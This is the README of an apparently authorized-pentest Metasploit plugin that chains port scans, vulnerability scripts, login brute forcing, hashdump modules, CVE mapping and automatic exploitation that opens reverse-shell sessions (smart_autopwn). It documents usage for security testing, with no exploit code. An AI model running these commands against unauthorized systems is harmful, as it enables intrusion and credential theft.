# 🔍 SmartAutoPwn – Intelligent Automated Exploitation Plugin for Metasploit

> **For authorized penetration testing only. Unauthorized use is illegal.**

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Database Setup](#database-setup)
- [Loading the Plugin](#loading-the-plugin)
- [Command Reference](#command-reference)
  - [smart\_help](#smart_help)
  - [smart\_status](#smart_status)
  - [smart\_scan](#smart_scan-full-pipeline)
  - [smart\_portscan](#smart_portscan)
  - [smart\_services](#smart_services)
  - [smart\_nse](#smart_nse)
  - [smart\_aux](#smart_aux)
  - [smart\_cve](#smart_cve)
  - [smart\_searchsploit](#smart_searchsploit)
  - [smart\_exploits](#smart_exploits)
  - [smart\_autopwn](#smart_autopwn)
  - [smart\_report](#smart_report)
- [AI-Based Exploit Prioritization](#ai-based-exploit-prioritization)
- [CVE Mapping Table](#cve-mapping-table)
- [Report Formats](#report-formats)
- [Workflow Diagram](#workflow-diagram)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Disclaimer](#disclaimer)

---

## Overview

**SmartAutoPwn** is a full-featured Metasploit plugin that automates the entire penetration test lifecycle on a single target IP:

```
smart_scan 192.168.1.10
```

One command triggers **7 automated stages**:

| Stage | Action |
|-------|--------|
| 1 | TCP + UDP threaded port scan (nmap) → saved to Metasploit DB |
| 2 | NSE vulnerability scripts (smb-vuln*, http-vuln*, ssl-*, etc.) |
| 3 | Auto-run all applicable auxiliary scanners per service |
| 4 | SearchSploit / ExploitDB search per service banner |
| 5 | CVE mapping for every open service |
| 6 | AI-scored, ranked exploit suggestions |
| 7 | HTML + PDF + JSON report generation |

---

## Features

| Feature | Description |
|---------|-------------|
| 🔌 **Auto Port Scan** | TCP top-1000 + UDP top-200, threaded, nmap-based, results imported to DB |
| 🗄️ **DB Storage** | All findings auto-saved to Metasploit PostgreSQL database |
| 📋 **Console Output** | All results printed live in msfconsole |
| 🛡️ **NSE Vuln Scripts** | 20+ NSE script categories including smb-vuln, http-vuln, ssl-heartbleed, etc. |
| 🤖 **AI Exploit Ranking** | Weighted scoring: MSF rank + service match + port match + version match |
| 🔍 **SearchSploit** | Automatic ExploitDB search per service/banner |
| 🗂️ **CVE Mapping** | 15+ service families mapped to known CVEs (EternalBlue, BlueKeep, Log4Shell, etc.) |
| 🔧 **Auxiliary Scanners** | Auto-launches relevant MSF auxiliary modules per service |
| 💥 **Auto-Exploit** | Attempts top-ranked exploits with auto-payload selection |
| 📊 **Reports** | Dark-themed HTML, PDF (via wkhtmltopdf), and JSON reports |
| 🧵 **Threaded Scanning** | Configurable parallelism (--threads N) |
| 📡 **UDP Scanning** | Optional UDP scan with --udp flag |

---

## Requirements

### Required

| Tool | Version | Install |
|------|---------|---------|
| Metasploit Framework | ≥ 6.0 | `sudo apt install metasploit-framework` |
| Ruby | ≥ 2.7 | Bundled with Metasploit |
| Nmap | any | `sudo apt install nmap` |
| PostgreSQL | ≥ 12 | `sudo apt install postgresql` |

### Optional (for extra features)

| Tool | Feature | Install |
|------|---------|---------|
| SearchSploit | ExploitDB searches | `sudo apt install exploitdb` |
| wkhtmltopdf | PDF report generation | `sudo apt install wkhtmltopdf` |

---

## Installation

### Step 1 – Copy the plugin file

```bash
# Copy to your user MSF plugins directory
cp smart_autopwn.rb ~/.msf4/plugins/

# Or for system-wide install
sudo cp smart_autopwn.rb /usr/share/metasploit-framework/plugins/
```

### Step 2 – Verify the file is in place

```bash
ls ~/.msf4/plugins/smart_autopwn.rb
```

---

## Database Setup

SmartAutoPwn saves all scan results to the Metasploit database. Set it up once:

```bash
# Initialize the MSF database (first-time only)
sudo msfdb init

# Start msfconsole and verify DB connection
msfconsole
msf6 > db_status
# Should show: [*] Connected to msf. Connection type: postgresql.
```

### Optional – Use a named workspace per target

```bash
msf6 > workspace -a pentest_192_168_1_10
msf6 > workspace pentest_192_168_1_10
```

---

## Loading the Plugin

### Load manually inside msfconsole

```bash
msf6 > load smart_autopwn
```

Expected output:
```
[+] SmartAutoPwn v3.0 plugin loaded successfully!
[*] Commands: type  smart_help  for full command reference
[*] Quick start: smart_scan <TARGET_IP>
```

### Load automatically on every msfconsole start

```bash
echo "load smart_autopwn" >> ~/.msf4/msfconsole.rc
```

### Unload the plugin

```bash
msf6 > unload smart_autopwn
```

---

## Command Reference

---

### `smart_help`

Display the full command reference inside msfconsole.

```bash
msf6 > smart_help
```

---

### `smart_status`

Show database connection status, workspace info, and tool availability.

```bash
msf6 > smart_status
```

**Sample output:**
```
[+] SmartAutoPwn v3.0 – System Status
──────────────────────────────────────────────────
[+] Database     : CONNECTED
[*] Workspace    : default
[*] Total Hosts  : 5
[*] Total Svc    : 42
[*] Total Vulns  : 7
[*] Open Sessions: 0
[*] Nmap         : FOUND
[*] SearchSploit : FOUND
[*] wkhtmltopdf  : FOUND
```

---

### `smart_scan` (Full Pipeline)

Run the **complete automated pipeline** on a target — one command does everything.

```bash
msf6 > smart_scan <TARGET_IP>
```

**Examples:**

```bash
# Full scan on a single target
msf6 > smart_scan 192.168.1.10

# Full scan on a hostname
msf6 > smart_scan metasploitable.local
```

**What it runs (7 stages):**

```
[Stage 1/7] TCP + UDP Port Scan
[Stage 2/7] NSE Vulnerability Scripts
[Stage 3/7] Auxiliary Scanners
[Stage 4/7] SearchSploit / ExploitDB
[Stage 5/7] CVE Mapping
[Stage 6/7] AI-Ranked Exploit Search
[Stage 7/7] Report Generation (HTML + PDF + JSON)
```

> 💡 Results of all stages are saved to the Metasploit database and printed to console in real time.

---

### `smart_portscan`

Run a TCP and/or UDP port scan on the target. Results are imported to the DB automatically.

```bash
msf6 > smart_portscan <TARGET_IP> [OPTIONS]
```

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--udp` | off | Also run UDP scan (top-200 ports, requires root) |
| `--threads N` | 200 | Nmap parallelism level |
| `--top-ports N` | 1000 | Number of top TCP ports to scan |

**Examples:**

```bash
# TCP only (fast)
msf6 > smart_portscan 192.168.1.10

# TCP + UDP with custom threads
msf6 > smart_portscan 192.168.1.10 --udp --threads 150

# Scan more ports
msf6 > smart_portscan 192.168.1.10 --top-ports 5000

# Full options
msf6 > smart_portscan 192.168.1.10 --udp --threads 100 --top-ports 2000
```

**Notes:**
- Raw XML results saved to `/tmp/smartautopwn_scans/`
- Results are automatically imported into the current MSF workspace
- UDP scanning requires root / sudo privileges

---

### `smart_services`

Display all services discovered for a host from the Metasploit database.

```bash
msf6 > smart_services <TARGET_IP>
```

**Example:**

```bash
msf6 > smart_services 192.168.1.10
```

**Sample output:**
```
[+] Discovered services on 192.168.1.10 [8 total]

  PORT       PROTO  SERVICE     VERSION / INFO
  ──────────────────────────────────────────────────────────────────────
  21/tcp     open   ftp         vsftpd 2.3.4
  22/tcp     open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1
  80/tcp     open   http        Apache httpd 2.2.8
  139/tcp    open   netbios     Samba smbd 3.X – 4.X
  445/tcp    open   smb         Samba smbd 3.0.20-Debian
  3306/tcp   open   mysql       MySQL 5.0.51a-3ubuntu5
  5432/tcp   open   postgresql  PostgreSQL DB 8.3.0 – 8.3.7
  5900/tcp   open   vnc         VNC protocol 3.3
```

---

### `smart_nse`

Run Nmap NSE vulnerability scripts against the target. Results are saved to DB.

```bash
msf6 > smart_nse <TARGET_IP>
```

**Example:**

```bash
msf6 > smart_nse 192.168.1.10
```

**NSE scripts executed include:**

| Category | Scripts |
|----------|---------|
| General vuln | `vuln`, `exploit`, `auth`, `safe` |
| SMB | `smb-vuln-ms17-010`, `smb-vuln-ms08-067`, `smb-vuln-cve-2017-7494` |
| HTTP | `http-vuln-cve2014-3704`, `http-vuln-cve2017-5638`, `http-shellshock`, `http-vuln-cve2021-41773` |
| FTP | `ftp-vsftpd-backdoor`, `ftp-proftpd-backdoor` |
| SSL | `ssl-heartbleed`, `ssl-poodle` |
| RDP | `rdp-vuln-ms12-020` |
| DB | `ms-sql-empty-password`, `mysql-empty-password` |
| Other | `smtp-vuln-cve2010-4344`, `vnc-info` |

**Sample vulnerability output:**
```
[!]   VULNERABLE: Remote Code Execution vulnerability in Samba
[!]     CVE-2017-7494
[!]     State: VULNERABLE
```

---

### `smart_aux`

Automatically run all applicable Metasploit auxiliary scanner modules for every discovered service.

```bash
msf6 > smart_aux <TARGET_IP>
```

**Example:**

```bash
msf6 > smart_aux 192.168.1.10
```

**Auto-launched scanner families:**

| Service | Auxiliary Modules Run |
|---------|-----------------------|
| FTP | `ftp/anonymous`, `ftp/ftp_version`, `ftp/ftp_login` |
| SSH | `ssh/ssh_version`, `ssh/ssh_enumusers`, `ssh/ssh_login` |
| HTTP | `http/http_version`, `http/dir_scanner`, `http/robots_txt`, `http/http_put`, `http/title` |
| HTTPS | `http/ssl`, `http/cert`, `http/heartbleed` |
| SMB | `smb/smb_version`, `smb/smb_enumshares`, `smb/smb_ms17_010`, `smb/smb_login` |
| MySQL | `mysql/mysql_version`, `mysql/mysql_login`, `mysql/mysql_hashdump` |
| MSSQL | `mssql/mssql_ping`, `mssql/mssql_login`, `mssql/mssql_enum` |
| RDP | `rdp/rdp_scanner`, `rdp/cve_2019_0708_bluekeep`, `rdp/ms12_020_check` |
| VNC | `vnc/vnc_none_auth`, `vnc/vnc_login` |
| SNMP | `snmp/snmp_enum`, `snmp/snmp_enumusers`, `snmp/snmp_login` |
| PostgreSQL | `postgres/postgres_version`, `postgres/postgres_login`, `postgres/postgres_hashdump` |
| Redis | `redis/redis_server`, `redis/file_upload` |
| SMTP | `smtp/smtp_version`, `smtp/smtp_enum`, `smtp/smtp_relay` |

> All jobs are queued asynchronously. Check with: `jobs -l`

---

### `smart_cve`

Map all discovered services to known CVEs from the built-in database.

```bash
msf6 > smart_cve <TARGET_IP>
```

**Example:**

```bash
msf6 > smart_cve 192.168.1.10
```

**Sample output:**
```
[+] CVE Mapping for 192.168.1.10

  445/tcp [SMB] Samba smbd 3.0.20-Debian
    ► CVE-2017-0144  – EternalBlue / MS17-010 (WannaCry)
    ► CVE-2020-0796  – SMBGhost (SMBv3 Compression RCE)
    ► CVE-2017-0145  – EternalRomance / MS17-010

  5900/tcp [VNC] VNC protocol 3.3
    ► CVE-2006-2369  – RealVNC Authentication Bypass

[+] Total CVEs mapped: 4
```

---

### `smart_searchsploit`

Search ExploitDB for exploits matching discovered service banners using SearchSploit.

```bash
msf6 > smart_searchsploit <TARGET_IP>
```

**Example:**

```bash
msf6 > smart_searchsploit 192.168.1.10
```

**Sample output:**
```
[+] SearchSploit: 'vsftpd 2.3.4' → 2 result(s) [port 21]
  [remote     ] vsftpd 2.3.4 - Backdoor Command Execution
               Path: exploits/unix/remote/17491.rb
  [remote     ] vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
               Path: exploits/unix/remote/49757.py
```

> Requires: `sudo apt install exploitdb`

---

### `smart_exploits`

Find all applicable exploits for the target's services. Results are AI-scored and ranked.

```bash
msf6 > smart_exploits <TARGET_IP> [OPTIONS]
```

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--rank <level>` | `normal` | Minimum rank filter |
| `--auto-rank` | off | Enable AI-based ranking (enabled by default in smart_scan) |

**Rank levels (high → low):** `excellent` → `great` → `good` → `normal` → `average` → `low` → `manual`

**Examples:**

```bash
# Find all exploits (normal rank and above)
msf6 > smart_exploits 192.168.1.10

# Only show excellent/great exploits
msf6 > smart_exploits 192.168.1.10 --rank excellent

# Show good and above
msf6 > smart_exploits 192.168.1.10 --rank good
```

**Sample output:**
```
[+] Found 12 exploit(s) for 192.168.1.10:

  RANK             AISCORE  PORT   SERVICE     MODULE
  ──────────────────────────────────────────────────────────────────────────────
  Excellent         97  445    smb         exploit/windows/smb/ms17_010_eternalblue
  Excellent         95  21     ftp         exploit/unix/ftp/vsftpd_234_backdoor
  Great             88  3306   mysql       exploit/multi/mysql/mysql_udf_payload
  Good              81  5900   vnc         exploit/multi/vnc/vnc_keyboard_inject
  Normal            74  80     http        exploit/multi/http/php_cgi_arg_injection
```

---

### `smart_autopwn`

Automatically attempt exploitation of the target using ranked exploits. Payloads are auto-selected.

```bash
msf6 > smart_autopwn <TARGET_IP> [OPTIONS]
```

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--rank <level>` | `excellent` | Only attempt exploits at this rank or above |
| `--lhost <IP>` | auto-detected | Your listener IP for reverse shells |
| `--lport <N>` | `4444` | Starting LPORT (increments per exploit) |
| `--stop-on-session` | off | Stop after first successful session |

**Examples:**

```bash
# Auto-exploit using only Excellent-ranked exploits
msf6 > smart_autopwn 192.168.1.10

# Use Great rank and above with a custom LHOST
msf6 > smart_autopwn 192.168.1.10 --rank great --lhost 10.10.10.5

# Stop as soon as one session is obtained
msf6 > smart_autopwn 192.168.1.10 --rank excellent --stop-on-session

# Full options
msf6 > smart_autopwn 192.168.1.10 --rank good --lhost 192.168.1.5 --lport 5555 --stop-on-session
```

**After running:**
```bash
# List opened sessions
msf6 > sessions -l

# Interact with a session
msf6 > sessions -i 1
```

> ⚠️ Each exploit attempt has a **30-second timeout** to prevent hanging.

---

### `smart_report`

Generate a detailed penetration test report in HTML, PDF, and/or JSON format.

```bash
msf6 > smart_report <TARGET_IP> [OPTIONS]
```

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--format <type>` | `html` | Report format: `html`, `pdf`, `json`, `all` |
| `--outdir <path>` | `/tmp/smartautopwn_reports` | Output directory |

**Examples:**

```bash
# HTML report (default)
msf6 > smart_report 192.168.1.10

# All formats (HTML + PDF + JSON)
msf6 > smart_report 192.168.1.10 --format all

# JSON only
msf6 > smart_report 192.168.1.10 --format json

# Save to custom directory
msf6 > smart_report 192.168.1.10 --format all --outdir /root/reports/

# PDF only
msf6 > smart_report 192.168.1.10 --format pdf
```

**Output files:**
```
/tmp/smartautopwn_reports/
├── smartautopwn_192_168_1_10_20240115_143022.html
├── smartautopwn_192_168_1_10_20240115_143022.pdf
└── smartautopwn_192_168_1_10_20240115_143022.json
```

> PDF generation requires: `sudo apt install wkhtmltopdf`

---

## AI-Based Exploit Prioritization

SmartAutoPwn uses a weighted scoring algorithm to rank exploits intelligently:

```
AI Score = (Rank Score × 40%)
         + (Service Name Match × 25%)
         + (Port Match × 15%)
         + (Version String Match × 15%)
         + (Module Path Depth × 5%)
```

| Component | Weight | Description |
|-----------|--------|-------------|
| **MSF Rank Score** | 40% | ExcellentRanking=100, GreatRanking=90, GoodRanking=80, etc. |
| **Service Name Match** | 25% | Module fullname or description contains the service name |
| **Port Match** | 15% | Module description references the exact port number |
| **Version Match** | 15% | Version tokens from banner found in module description |
| **Specificity Bonus** | 5% | Deeper module path = more targeted exploit |

**Rank Score Mapping:**

| MSF Rank | Score |
|----------|-------|
| ExcellentRanking | 100 |
| GreatRanking | 90 |
| GoodRanking | 80 |
| NormalRanking | 70 |
| AverageRanking | 60 |
| LowRanking | 40 |
| ManualRanking | 20 |

---

## CVE Mapping Table

Built-in CVE database covers 15+ service families:

| Service | Key CVEs Mapped |
|---------|----------------|
| **FTP** | CVE-2011-2523 (vsftpd backdoor), CVE-2010-4221, CVE-2015-3306 |
| **SSH** | CVE-2018-15473 (user enum), CVE-2023-38408 (RCE) |
| **SMTP** | CVE-2010-4344 (Exim), CVE-2020-7247 (OpenSMTPD) |
| **HTTP** | CVE-2021-41773 (Apache), CVE-2021-44228 (Log4Shell), CVE-2014-6271 (Shellshock) |
| **HTTPS** | CVE-2014-0160 (Heartbleed), CVE-2022-22965 (Spring4Shell) |
| **SMB** | CVE-2017-0144 (EternalBlue/MS17-010), CVE-2020-0796 (SMBGhost) |
| **RDP** | CVE-2019-0708 (BlueKeep), CVE-2019-1181/1182 (DejaBlue) |
| **MySQL** | CVE-2012-2122 (Auth Bypass), CVE-2016-6662 (Config RCE) |
| **MSSQL** | CVE-2000-1209 (xp_cmdshell), CVE-2020-0618 (SSRS RCE) |
| **VNC** | CVE-2006-2369 (Auth Bypass), CVE-2019-15694 |
| **SNMP** | CVE-2017-6736 (Cisco), CVE-2002-0013 (Community String) |
| **LDAP** | CVE-2021-44228 (Log4Shell via JNDI) |
| **Oracle** | CVE-2012-1675 (TNS Poison), CVE-2019-2725 (WebLogic) |
| **PostgreSQL** | CVE-2019-9193 (COPY PROGRAM RCE) |
| **Redis** | CVE-2022-0543 (Lua Sandbox Escape) |

---

## Report Formats

### HTML Report
- Dark-themed, professional layout
- Statistics summary cards (services, exploits, CVEs, sessions)
- Color-coded service table (port, state, version)
- AI-ranked exploit table with colored badges
- CVE mapping table with CVE IDs highlighted
- Suitable for direct delivery to clients

### PDF Report
- Converted from HTML via `wkhtmltopdf`
- Same content as HTML, printer-friendly
- Requires: `sudo apt install wkhtmltopdf`

### JSON Report
- Machine-readable structured output
- Contains: metadata, services array, CVE mappings array, top exploits array
- Useful for integration with other tools or scripts

---

## Workflow Diagram

```
smart_scan 192.168.1.10
        │
        ├─► [1] smart_portscan  → nmap TCP+UDP → import to Metasploit DB
        │
        ├─► [2] smart_nse       → nmap NSE vuln scripts → import to DB
        │
        ├─► [3] smart_aux       → auxiliary/scanner/* → queued as jobs
        │
        ├─► [4] smart_searchsploit → ExploitDB per service banner
        │
        ├─► [5] smart_cve       → CVE lookup per service
        │
        ├─► [6] smart_exploits  → AI-scored MSF exploit list
        │          │
        │          └─► smart_autopwn → auto-attempt → sessions
        │
        └─► [7] smart_report    → HTML + PDF + JSON
```

---

## Troubleshooting

### Database not connected

```bash
# Initialize and start the database
sudo msfdb init
msfconsole
msf6 > db_status
```

If still failing:
```bash
sudo service postgresql start
sudo msfdb reinit
```

### Nmap not found

```bash
sudo apt update && sudo apt install nmap
```

### SearchSploit not found

```bash
sudo apt install exploitdb
# or
sudo apt install exploitdb-bin-sploits
searchsploit -u   # update database
```

### PDF reports not generating

```bash
sudo apt install wkhtmltopdf
# Test it:
wkhtmltopdf --version
```

### UDP scan fails (permission denied)

UDP scanning requires root:
```bash
sudo msfconsole
msf6 > smart_portscan 192.168.1.10 --udp
```

### Plugin not loading (file not found)

```bash
# Check location
ls ~/.msf4/plugins/smart_autopwn.rb

# Re-copy if missing
cp smart_autopwn.rb ~/.msf4/plugins/

# Load manually
msf6 > load smart_autopwn
```

### No services found after portscan

Verify the DB has the host:
```bash
msf6 > hosts
msf6 > services
```

If empty, check the XML import manually:
```bash
msf6 > db_import /tmp/smartautopwn_scans/tcp_192_168_1_10_*.xml
```

### Exploits show 0 results

The MSF module database may not be indexed. Fix:
```bash
msf6 > db_rebuild_cache
# Wait for it to finish, then retry:
msf6 > smart_exploits 192.168.1.10
```

---

## FAQ

**Q: Does SmartAutoPwn store scan results permanently?**  
A: Yes — all nmap XML results are imported into the Metasploit PostgreSQL database. Results persist across sessions in the current workspace.

**Q: Can I scan a /24 subnet?**  
A: The plugin is designed for single-target scans. For subnet scanning, use `db_nmap -sV 192.168.1.0/24` first, then run `smart_exploits` and `smart_cve` per host.

**Q: Does smart_autopwn actually exploit the target?**  
A: Yes, it attempts to run matching Metasploit exploit modules. Only use on systems you own or have explicit written permission to test.

**Q: Why does smart_autopwn timeout quickly?**  
A: Each exploit gets a 30-second window to avoid hanging the console. Increase this by editing `timeout = 30` in the `cmd_smart_autopwn` method.

**Q: How do I save results to a different workspace?**  
A: Create and switch workspace before scanning:
```bash
msf6 > workspace -a client_pentest
msf6 > workspace client_pentest
msf6 > smart_scan 192.168.1.10
```

**Q: Can I run only specific stages?**  
A: Yes — every stage is an individual command. You can call them in any order.

---

## Disclaimer

> This tool is intended **only for authorized security testing and educational purposes**.  
> Always obtain **explicit written permission** before scanning or exploiting any system.  
> Unauthorized use may violate computer crime laws in your jurisdiction.  
> The author assumes no liability for misuse of this software.

---

*SmartAutoPwn v3.0 — Metasploit Plugin*
